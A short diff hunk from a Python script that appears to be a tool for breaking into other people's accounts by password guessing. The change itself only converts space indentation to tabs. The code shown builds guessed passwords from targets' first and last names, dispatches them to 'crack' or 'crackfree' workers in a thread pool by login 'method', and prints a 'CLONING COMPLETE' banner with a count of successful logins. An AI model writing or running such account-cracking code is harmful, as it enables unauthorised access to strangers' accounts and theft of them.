@@ -683,19 +683,19 @@ def passwrd():
 					pwv.append(lst+frs+'123')
 					pwv.append(lst+frs+'111')
             if 'ya' in pwpluss:
-                for xpwd in pwnya:
-                    pwv.append(xpwd)
-            else:pass
-            if 'mobile' in method:
-                pool.submit(crack,idf,pwv)
-            elif 'free' in method:
-                pool.submit(crackfree,idf,pwv)
-            elif 'touch' in method:
-                pool.submit(crackfree,idf,pwv)
-            elif 'mbasic' in method:
-                pool.submit(crackfree,idf,pwv)
-            else:
-                pool.submit(crackfree,idf,pwv)
+				for xpwd in pwnya:
+					pwv.append(xpwd)
+			else:pass
+			if 'mobile' in method:
+				pool.submit(crack,idf,pwv)
+			elif 'free' in method:
+				pool.submit(crackfree,idf,pwv)
+			elif 'touch' in method:
+				pool.submit(crackfree,idf,pwv)
+			elif 'mbasic' in method:
+				pool.submit(crackfree,idf,pwv)
+			else:
+				pool.submit(crackfree,idf,pwv)
     print('\033[0;91m------------------------------------------')
     print('\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37mCLONING COMPLETE TIME :\033[0;91m'+time.strftime("%H:%M")+" "+ tag)
     print('\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m OK :\033[0;91m %s '%(ok))
